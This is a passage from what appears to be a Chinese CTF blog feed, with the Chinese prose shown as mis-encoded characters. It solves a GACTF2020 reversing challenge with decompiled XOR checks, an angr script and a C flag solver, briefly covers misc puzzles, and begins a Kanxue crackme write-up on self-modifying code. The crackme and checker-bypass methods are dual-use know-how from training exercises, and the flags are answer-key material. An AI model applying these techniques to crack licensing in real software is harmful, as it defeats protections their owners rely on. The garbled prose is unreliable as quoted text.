dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">357</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">8</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">301</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">303</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">10</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">313</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">11</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">12</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">187</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">13</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">8</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">14</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">15</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">319</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">16</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">314</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">17</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">353</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">18</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">87</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">19</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">288</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">20</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">21</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">319</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">22</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">319</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">23</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">181</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">24</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">275</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">25</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">160</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">26</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">289</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">27</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">28</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">11</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">29</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">313</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">30</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">371</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">31</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">70</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢æ‰“å°å‡ºçš„æ‰§è¡Œï¼Œæ•´ä¸ªç¨‹åºå°±å¾ˆæ¸…æ¥šäº†ã€‚</p><p>é¦–å…ˆå°±æ˜¯é€†å‡ºè¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´å‹æ•°æ®ï¼Œä½†çœ‹äº†ä¸‹ç®—æ³•ï¼Œç¡®å®éº»çƒ¦ã€‚ã€‚æ­£å¥½ä¹‹å‰å­¦ä¹ äº†ä¸‹angrç¬¦å·æ‰§è¡Œï¼Œç”¨è¿™ä¸ªé¢˜å°è¯•ä¸€ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, claripy, sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success</span><span class="params">(state)</span>:</span></span><br><span class="line">    std_out = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'flag:'</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_false</span><span class="params">(state)</span>:</span></span><br><span class="line">    std_out = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'é”™è¯¯ä¿¡æ¯'</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">'EasyRe'</span>) <span class="comment">#ä»£è¡¨ç¨‹åºçš„â€œåˆå§‹åŒ–æ˜ åƒâ€</span></span><br><span class="line">init_state = proj.factory.entry_state() <span class="comment">#è¡¨ç¤ºæ¨¡æ‹Ÿä»ç¨‹åºçš„å…¥å£ç‚¹å¼€å§‹çš„çŠ¶æ€</span></span><br><span class="line">good_addr = <span class="number">0x08048BE0</span> </span><br><span class="line">bad_addr = <span class="number">0x08048BF1</span></span><br><span class="line">sim = proj.factory.simgr(init_state) <span class="comment">#ç”³æ˜stateçš„æ¨¡æ‹Ÿç®¡ç†å™¨simæ¥ç”¨äºæ‰§è¡Œæ¨¡æ‹Ÿçš„ç¨‹åº</span></span><br><span class="line">sim.explore(find = is_success) <span class="comment">#æ¨¡æ‹Ÿç¨‹åºçš„æ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>): <span class="comment">#æ‰“å°å‡ºæ ‡å‡†è¾“å…¥ï¼Œè¾“å‡ºï¼Œé”™è¯¯è¾“å‡ºã€‚</span></span><br><span class="line">print(sim.found[<span class="number">0</span>].posix.dumps(i))</span><br></pre></td></tr></table></figure><p><img src="/2020/08/30/GACTF2020/image-20200913202220431.png" alt="image-20200913202220431"></p><p>å¾ˆå¿«å¾—åˆ°äº†ç­”æ¡ˆï¼Œå°è¯•è¾“å…¥ä¸€ä¸‹ï¼Œæ­£ç¡®ã€‚<img src="/2020/08/30/GACTF2020/image-20200913200733625.png" alt="image-20200913200733625"></p><p>å¼€å§‹ä½¿ç”¨è¿™ä¸ªæ•´å‹æ•°æ®è®¡ç®—å‡ºdword_804B2A0æ•°ç»„ä¸­çš„4ä¸ªå€¼ã€‚</p><p>åˆšåˆšè®¡ç®—å®Œå‡†å¤‡ä¾æ¬¡é€†å‡ºflagä¸­çš„æ¯ä¸€ä½æ—¶å°±æƒ³åˆ°ï¼Œå…¶å®å¯ä»¥ä¸ç”¨è®¡ç®—ç¬¬ä¸€ä¸ªè¾“å…¥çš„æ•´å‹æ•°æ®ï¼Œå› ä¸ºç»™äº†flagçš„æ ¼å¼ä¸ºGACTFã€‚ã€‚ã€‚æ ¹æ®è¿™ä¸ªå°±å¯ä»¥è®¡ç®—å‡ºdword_804B2A0æ•°ç»„ä¸­çš„æ¯ä¸€ä½ã€‚ã€‚</p><p>å¼€å§‹åˆ©ç”¨ä¹‹å‰å¤åˆ¶åˆ°Cè¯­è¨€ç¼–è¯‘å™¨ä¸­çš„ä»£ç æ‰“å°å‡ºflagä¸­æ¯ä¸€ä½ä¸dword_804B2A0[]æ•°ç»„å¼‚æˆ–çš„æ˜¯å“ªä¸€ä½ï¼Œä¸æœ€åéœ€è¦ç”¨æ¥æ¯”è¾ƒçš„æ•°æ®ã€‚</p><p>æœ€åç®—ä¸€ä¸‹ï¼Œå¾—åˆ°flagï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a[] = &#123;<span class="number">267</span>, <span class="number">122</span>, <span class="number">149</span>, <span class="number">262</span>, <span class="number">125</span>, <span class="number">173</span>, <span class="number">303</span>, <span class="number">357</span>,</span><br><span class="line"><span class="number">301</span>, <span class="number">303</span>, <span class="number">313</span>, <span class="number">269</span>, <span class="number">187</span>, <span class="number">8</span>, <span class="number">269</span>, <span class="number">319</span>, </span><br><span class="line"><span class="number">314</span>, <span class="number">353</span>, <span class="number">87</span>, <span class="number">288</span>, <span class="number">269</span>, <span class="number">319</span>, <span class="number">319</span>, <span class="number">181</span>,</span><br><span class="line"><span class="number">275</span>, <span class="number">160</span>, <span class="number">289</span>, <span class="number">269</span>, <span class="number">11</span>, <span class="number">313</span>, <span class="number">371</span>, <span class="number">70</span>&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">char</span> b[] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> s[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">s[<span class="number">0</span>] = <span class="string">'G'</span> ^ a[<span class="number">0</span>];</span><br><span class="line">s[<span class="number">1</span>] = <span class="string">'A'</span> ^ a[<span class="number">1</span>];</span><br><span class="line">s[<span class="number">2</span>] = <span class="string">'T'</span> ^ a[<span class="number">3</span>];</span><br><span class="line">s[<span class="number">3</span>] = <span class="string">'C'</span> ^ a[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">flag[i] = a[i] ^ s[b[i]];</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//GACTF&#123;c7ack_m3_sh3ll_smc_vm_0k?&#125;</span></span><br></pre></td></tr></table></figure><p>å…¶å®ä¹Ÿæ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªé¢˜ï¼Œåˆ©ç”¨flagçš„æ ¼å¼ã€‚ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="SignIN"><a href="#SignIN" class="headerlink" title="SignIN"></a>SignIN</h3><p>å°†äºŒç»´ç æ‹¼æ¥ä¸€ä¸‹ï¼Œæ‰«å‡ºflagã€‚</p><p><img src="/2020/08/30/GACTF2020/image-20200913201331681.png" alt="image-20200913201331681"></p><p><strong>welc0me_t0_GACTF_have_Fun</strong></p><h3 id="crymisc"><a href="#crymisc" class="headerlink" title="crymisc"></a>crymisc</h3><p>ä¸€ä¸ªwordæ–‡æ¡£ï¼Œä½†æ˜¯æ‰“ä¸å¼€ã€‚æ‹–è¿›010editoræŸ¥çœ‹ï¼Œå‘ç°<strong>504B(PK)</strong>ï¼Œæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ã€‚</p><p>æ”¹æ–‡ä»¶åç¼€åå…¶ä¸­ä¸€ä¸ªæ–‡ä»¶è§£å‹å¤±è´¥ã€‚</p><p><img src="/2020/08/30/GACTF2020/image-20200913202250211.png" alt="image-20200913202250211"></p><p>è°·æ­Œçœ‹è§å¯ä»¥ä½¿ç”¨winraræ¥ä¿®å¤ä¸€ä¸‹ã€‚</p><p>ä¸‹è½½åï¼Œåœ¨winrarä¸­æ‰“å¼€å´æ˜¯æç¤ºæœ‰å¯†ç ã€‚ã€‚é‚£å°±çŒœæµ‹æ˜¯ä¼ªåŠ å¯†äº†ã€‚ã€‚ä¸‹é¢ä¿®æ”¹ä¸ºå¶æ•°å³å¯ã€‚<img src="/2020/08/30/GACTF2020/image-20200913203212543.png" alt="image-20200913203212543"></p><p>360å‹ç¼©è¿˜æ˜¯å¥‡å¦™ï¼Œä¼ªåŠ å¯†æ–‡ä»¶ç›´æ¥æç¤ºæ–‡ä»¶å‡ºé”™ã€‚ã€‚</p><p>ç„¶åæ‰“å¼€ä¸€å¼ å›¾ç‰‡å’Œä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚æ–‡æœ¬æ–‡ä»¶æ²¡æœ‰ä»€ä¹ˆï¼ŒæŸ¥çœ‹å›¾ç‰‡äºŒè¿›åˆ¶ä¿¡æ¯ã€‚åœ¨æœ€åå‘ç°ï¼š<img src="/2020/08/30/GACTF2020/image-20200913203442903.png" alt="image-20200913203442903"></p><p>åˆæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½†åœ¨å¼€å¤´å‡ºç°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä»ç»„æˆçŒœæµ‹æ˜¯base64åŠ å¯†ã€‚è§£å¯†å¾—åˆ°ï¼š<img src="/2020/08/30/GACTF2020/image-20200913203556733.png" alt="image-20200913203556733"></p><p>çœ‹æ¥æ˜¯åé¢å‹ç¼©åŒ…çš„å¯†ç ã€‚ç„¶åæŠŠè¯¥å‹ç¼©åŒ…çš„å¤´è¡¥å…¨ï¼ˆ<strong>504b</strong>ï¼‰ï¼Œè¾“å…¥å¯†ç è§£å‹ï¼š<img src="/2020/08/30/GACTF2020/image-20200913203858388.png" alt="image-20200913203858388"></p><p>åˆ°è¿™ä¸€æ­¥å°±ä¸€ç›´å¡ä½äº†ã€‚ã€‚ã€‚å®åœ¨æ²¡è§è¿‡è¿™ä¸ªè¡¨æƒ…å¯†ç ï¼Œè°·æ­Œç™¾åº¦æŸ¥åˆ°çš„ä¿¡æ¯åˆä¸ä¼šç”¨ï¼Œï¼Œï¼Œ</p><p>æ¯”èµ›å®Œäº†æ‰ä»ä¸€ä½å¸ˆå‚…å“ªé‡ŒçŸ¥é“è¦è‡ªå·±ä»githubæ‰¾åˆ°è¿™ä¸ªé¡¹ç›®è‡ªå·±æ­å»ºä¸€ä¸‹ç¯å¢ƒï¼Œç„¶åæ ¹æ®ä¸€å¼ è¡¨æ˜ å°„å…³ç³»è§£å¯†ã€‚ã€‚ã€‚</p><p>æ ¹æ®å¸ˆå‚…çš„æŒ‡å¯¼æ­å»ºå®Œåï¼Œä»é¢˜ç›®ä¹Ÿå¾ˆå®¹æ˜“æƒ³åˆ°è§£å¯†çš„keyæ˜¯å“­è„¸è¡¨æƒ…ã€‚</p><p>æœ€åè§£å¯†ï¼š<img src="/2020/08/30/GACTF2020/image-20200913204636657.png" alt="image-20200913204636657"></p><p>è¿˜æœ‰ä¸€ä¸ªå‘å°±æ˜¯ï¼Œä¸‹é¢çš„è¡¨æƒ…å…¶å®æ˜¯åŒä¸€ä¸ªï¼Œæˆ‘è¿˜çº ç»“åŠå¤©ã€‚ã€‚<img src="/2020/08/30/GACTF2020/image-20200913204805711.png" alt="image-20200913204805711"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åšäº†2ä¸ªé€†å‘åŠæ‚é¡¹è¿˜æ˜¯æœ‰æ”¶è·ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>CrackMe</title>
    <link href="https://www.bxnop.cn/2020/07/31/CrackMe/"/>
    <id>https://www.bxnop.cn/2020/07/31/CrackMe/</id>
    <published>2020-07-31T06:53:57.000Z</published>
    <updated>2020-08-13T06:57:57.844Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬å¸–ä¸»è¦å¯¹ç»ƒä¹ Crackmeçš„çŸ¥è¯†ç‚¹ä¸çªç ´ç‚¹è¿›è¡Œè®°å½•ã€‚<a id="more"></a></p><h2 id="ç¿©è‹¥æƒŠé¸¿"><a href="#ç¿©è‹¥æƒŠé¸¿" class="headerlink" title="ç¿©è‹¥æƒŠé¸¿"></a>ç¿©è‹¥æƒŠé¸¿</h2><p>â€”â€”é¢˜ç›®æ¥è‡ªçœ‹é›ªé¢˜åº“</p><p>æ— å£³ï¼Œçª—å£ç¨‹åºï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªnameä¸keyçœ‹ç¨‹åºçš„åé¦ˆã€‚</p><p>æœ‰é”™è¯¯æç¤ºæ¡†ï¼Œè½½å…¥ODæœç´¢ç›¸åº”çš„APIï¼Œåªæ˜¯å¾ˆå¤šAPIåºå·ï¼Œåº”è¯¥æ˜¯MFC42åº“åºå·å¯¼å‡ºçš„å‡½æ•°ã€‚<img src="/2020/07/31/CrackMe/image-20200813120443310.png" alt="image-20200813120443310"></p><p>é‚£ç°åœ¨æœç´¢å­—ç¬¦ä¸²çœ‹çœ‹ï¼Œæˆ–ä½¿ç”¨ä¸€ä¸ªä¸‹æ–­ç‚¹çš„æ’ä»¶ä¸‹æ–­ï¼Œç„¶åæŸ¥çœ‹è°ƒç”¨å †æ ˆä¿¡æ¯æ‰¾åˆ°APIã€‚è¿™é‡Œ2ç§æ–¹æ³•å‡å¯ã€‚<img src="/2020/07/31/CrackMe/image-20200813121018755.png" alt="image-20200813121018755"></p><p>å‘ä¸Šå›æº¯ï¼š<img src="/2020/07/31/CrackMe/image-20200813125708215.png" alt="image-20200813125708215"></p><p>å¼€å§‹åœ¨ODä¸­è·Ÿè¿›<strong>004015E0</strong>å‡½æ•°ï¼Œä½†å¾ˆå¤šMFC42ä¸­å¯¼å‡ºçš„å‡½æ•°ï¼Œè·Ÿèµ·æ¥å®åœ¨æ¼ç«ã€‚ã€‚è¿˜æ˜¯ç»“åˆidaçš„F5å¤§æ³•æ¥çœ‹ï¼š</p><p>ä¸€å¼€å§‹é€†å‘åˆ†æç®—æ³•å°±å‘ç°äº†é—®é¢˜ï¼š<img src="/2020/07/31/CrackMe/image-20200813133718116.png" alt="image-20200813133718116"></p><p>ä¸Šé¢è¯´æ˜æ˜¯ä¸ªæ­»èƒ¡åŒï¼Œè¿™é‡Œå°±å¯ä»¥çŒœæµ‹æ˜¯ä¸Šé¢æœ‰å¯¹å‡½æ•°å¯¹402010å¤„ä»£ç è¿›è¡Œäº†é‡å†™ã€‚çœ‹å‰é¢çš„ä»£ç ï¼Œæœä¸å…¶ç„¶ï¼šç”¨äº†æˆ‘ä»¬è¾“å…¥keyçš„å‰4ä½æ¥é‡å†™402010å¤„ä»£ç ï¼Œä¸”æœ€åä¸€ä¸ªæ ¡éªŒï¼ˆæ£€æµ‹é‡å†™çš„ä»£ç æ˜¯å¦æ­£ç¡®ï¼‰ï¼Œæ ¡éªŒé€šè¿‡æ‰å°†é‡å†™çš„ä»£ç æ‹·è´åˆ°åŸåœ°å€å¤„ï¼ˆ0x402010ï¼‰ã€‚<img src="/2020/07/31/CrackMe/image-20200813134136959.png" alt="image-20200813134136959"></p><p>çœ‹äº†çœ‹é‡å†™ä¸æ ¡éªŒçš„ä»£ç ï¼Œéƒ½ä¸å¤æ‚ï¼Œå¤§å¤šæ•°å¯ä»¥ç›´æ¥å¤åˆ¶åˆ°ç¼–è¯‘å™¨æ¥ä½œä¸ºä¸€ä¸ªå‡½æ•°ä½¿ç”¨è¿›è€Œçˆ†ç ´å‡ºæ­£ç¡®çš„é‡å†™çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯å¾—åˆ°keyçš„å‰4ä½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 